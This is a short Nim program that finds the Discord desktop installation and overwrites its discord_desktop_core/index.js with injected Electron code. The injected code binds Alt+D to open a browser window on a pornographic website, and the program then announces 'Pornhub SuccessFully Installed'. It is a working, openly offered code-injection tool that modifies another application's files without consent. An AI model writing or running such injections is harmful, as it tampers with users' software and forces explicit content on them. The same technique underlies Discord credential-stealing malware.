
import std/[os, strutils, re]

var local = os.getEnv("LOCALAPPDATA")

proc getCode(): string =
    return """
const allahctron = require("electron")
allahctron.globalShortcut.register('Alt+D', () => {
    var bz = new allahctron.BrowserWindow({ width: 800, height: 600 })
    bz.loadURL("https://pornhub.com")
});
module.exports = require("./core.asar")"""

proc Walk(j: string): string = 
    for p, a in walkDir(j):
        var b = re.findAll(a, re("cord|app|modules"))
        for n in b:
            if "discord_cloudsync" in a:
                var zz = "ahah"
            else: 
                return a
            
proc Main(): void =
    var Discord = Walk(local)
    var App = Walk(Discord)
    var Modules = App & "/modules"
    var Core = Walk(Modules)
    var File = (Core & "/discord_desktop_core/index.js")
    writeFile(File, getCode())
    if readFile(File) == getCode():
        echo "[+] Pornhub SuccessFully Installed (ALT + D) in " & Discord & " Please Restart Discord To Take Effect"
        var name: string = readLine(stdin)
    else:
        echo "[-] Something Went Wrong !"
Main()